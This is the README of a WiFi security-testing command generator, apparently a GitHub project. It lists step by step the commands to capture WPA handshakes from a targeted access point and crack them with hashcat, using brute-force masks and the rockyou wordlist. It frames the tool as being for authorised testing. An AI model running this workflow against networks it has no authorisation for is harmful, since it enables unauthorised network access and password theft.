# WiFi Security Testing Command Generator

**Author:** GeekSloth

## ⚠️ IMPORTANT LEGAL DISCLAIMER

**THIS TOOL IS FOR EDUCATIONAL AND ETHICAL SECURITY TESTING PURPOSES ONLY**

By using this software, you acknowledge and agree to the following terms:

- This tool is designed exclusively for educational purposes and legitimate security testing of your own networks or networks you have explicit written permission to test
- **Unauthorized access to wireless networks is ILLEGAL and may violate federal, state, and local laws**
- The author assumes NO responsibility for any misuse, damage, or illegal activities performed with this tool
- Users are solely responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction
- This tool should only be used on networks you own or have explicit written authorization to test
- Any malicious or unauthorized use is strictly prohibited and may result in criminal prosecution

**USE AT YOUR OWN RISK. THE AUTHOR DISCLAIMS ALL LIABILITY.**

## Overview

The WiFi Security Testing Command Generator is a Python-based tool designed to streamline and automate the process of wireless network security testing. This tool generates and executes a comprehensive sequence of commands commonly used in penetration testing and security auditing of WiFi networks.

## Target Platform

This tool is specifically designed for:
- **Kali Linux** (Recommended)
- **Ubuntu/Debian-based Linux distributions**
- Any Linux distribution with the required wireless security tools installed

## Features

- **Interactive Menu System**: User-friendly command-line interface for easy navigation
- **Configurable Sessions**: Customizable session parameters including interface, MAC address, and channel settings
- **Template Support**: Load predefined command sequences from JSON configuration files
- **Command Execution**: Direct execution of security testing commands with output capture
- **Modular Design**: Object-oriented architecture for easy maintenance and extension

## Prerequisites

### Required Tools
Before using this generator, ensure the following tools are installed on your system:

```bash
# Update package repositories
sudo apt update

# Install essential wireless tools
sudo apt install -y aircrack-ng hashcat hcxtools hcxdumptool tcpdump iw wireless-tools

# Install development dependencies (if building from source)
sudo apt install -y libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
```

### Hardware Requirements
- A wireless network interface card (NIC) capable of monitor mode
- Sufficient system resources for packet capture and hash cracking operations

## Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/geeksloth/wifi-hacking-command-generator.git
   cd wifi-hacking-command-generator
   ```

2. **Ensure Python 3 is installed:**
   ```bash
   python3 --version
   ```

3. **Make the script executable:**
   ```bash
   chmod +x main_v1.py
   ```

## Configuration

The tool uses JSON configuration files to define command sequences. Two configuration files are provided:

- `config.dist.json`: Template configuration file
- `config.json`: Active configuration file

### Session Parameters

Configure the following parameters before starting your testing session:

- **Session Name**: Unique identifier for your testing session
- **Interface**: Wireless network interface (e.g., `wlan0`, `wlan1`)
- **MAC Address**: Target access point MAC address
- **Channel**: WiFi channel number
- **Frequency Band**: 2.4GHz or 5GHz band selection

## Usage

### Starting the Application

```bash
python3 main_v1.py
```

### Step-by-Step Security Testing Process

The tool provides a structured approach to WiFi security testing through the following steps:

#### Step 0: Configure Session
**Technical Description**: Initialize session parameters including target network specifications and interface configuration.
- Set session name for organized file management
- Configure wireless interface identifier
- Specify target access point MAC address
- Define operating channel and frequency band

#### Step 1: Interface Reconnaissance
**Technical Description**: Perform comprehensive wireless interface discovery and status assessment.
```bash
sudo iw dev                    # Display wireless device information
iwconfig                       # Show wireless interface configuration
sudo airmon-ng                 # List available wireless interfaces
sudo airmon-ng check kill      # Terminate conflicting processes
```

#### Step 2: Service Management
**Technical Description**: Disable network management services to prevent interference with monitor mode operations.
```bash
sudo systemctl stop NetworkManager.service    # Stop network manager
sudo systemctl stop wpa_supplicant.service   # Stop WPA supplicant
```

#### Step 3: Monitor Mode Activation
**Technical Description**: Configure the wireless interface for monitor mode to enable passive packet capture.
```bash
sudo airmon-ng start [interface]    # Enable monitor mode
```

#### Step 4: Network Discovery
**Technical Description**: Perform active wireless network reconnaissance to identify target access points and their characteristics.
```bash
sudo airodump-ng [interface]    # Scan for available networks
```

#### Step 5: BPF Filter Creation
**Technical Description**: Generate Berkeley Packet Filter (BPF) rules for targeted packet capture optimization.
```bash
sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3 [MAC] or wlan addr3 ffffffffffff' -ddd > [session]_attack.bpf
```

#### Step 6: Packet Capture Initialization
**Technical Description**: Deploy packet capture mechanisms using advanced wireless sniffing tools with BPF filtering.
```bash
sudo hcxdumptool -i [interface] -c [channel] --bpf=[session]_attack.bpf -w [session]_capture.pcapng
sudo tcpdump -U -s 0 -i [interface] -w [session]_capture.pcap -l -n -e -vv -r [session]_attack.bpf
```

#### Step 7: Hash Extraction
**Technical Description**: Convert captured wireless frames to hashcat-compatible formats for cryptographic analysis.
```bash
sudo hcxpcapngtool -o [session]_hash.hc22000 [session]_capture.pcapng    # WPA3/WPA2 format
sudo hcxpcaptool -z [session]_hash.16800 [session]_capture.pcapng        # Legacy WPA format
```

#### Step 8: Cryptographic Analysis
**Technical Description**: Execute hash cracking operations using GPU-accelerated password recovery techniques.
```bash
# Brute force attack with mask
hashcat -m 22000 [session]_hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d --force

# Dictionary attack
hashcat -m 16800 [session]_hash.16800 /usr/share/wordlists/rockyou.txt
```

#### Step 9: Service Restoration
**Technical Description**: Re-enable network management services to restore normal wireless functionality.
```bash
sudo systemctl start NetworkManager.service     # Restart network manager
sudo systemctl start wpa_supplicant.service    # Restart WPA supplicant
```

#### Step 10: Tool Maintenance
**Technical Description**: Automated installation and compilation of hcxtools suite for optimal compatibility.
```bash
sudo apt-get update
sudo apt-get install -y libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools && sudo make && sudo make install
```

## File Structure

```
wifi-hacking-command-generator/
├── main_v1.py           # Main application script
├── config.dist.json     # Template configuration
├── config.json          # Active configuration
├── new.json            # Session database
└── README.md           # This documentation
```

## Advanced Features

### JSON Database Management
The tool implements a custom JSON-based database system for:
- Command sequence storage and retrieval
- Session parameter persistence
- Template-based configuration loading

### Command Execution Engine
Supports both:
- **Synchronous execution**: Real-time output capture and display
- **Asynchronous execution**: Background process management for long-running operations

## Security Considerations

- Always verify you have proper authorization before testing any network
- Use strong, isolated testing environments when possible
- Regularly update all security tools to their latest versions
- Follow responsible disclosure practices for any vulnerabilities discovered

## Troubleshooting

### Common Issues

1. **Monitor mode activation failure**
   - Ensure wireless interface supports monitor mode
   - Check for conflicting network processes
   - Verify sufficient privileges (run as root/sudo)

2. **hcxdumptool compilation errors**
   - Install all required development dependencies
   - Use the automated tool maintenance step (Step 10)

3. **Packet capture issues**
   - Verify correct interface and channel configuration
   - Ensure BPF filter syntax is correct
   - Check for hardware compatibility

## Contributing

Contributions to improve this tool are welcome. Please ensure all contributions maintain the educational and ethical focus of the project.

## License

This project is distributed under the MIT License. See the license file for details.

## Version History

- **v1.0**: Initial release with core functionality
- Interactive menu system implementation
- JSON-based configuration management
- Automated command sequence generation

---

**Remember: This tool is for educational and authorized testing purposes only. Always respect privacy, follow applicable laws, and obtain proper authorization before testing any network.**
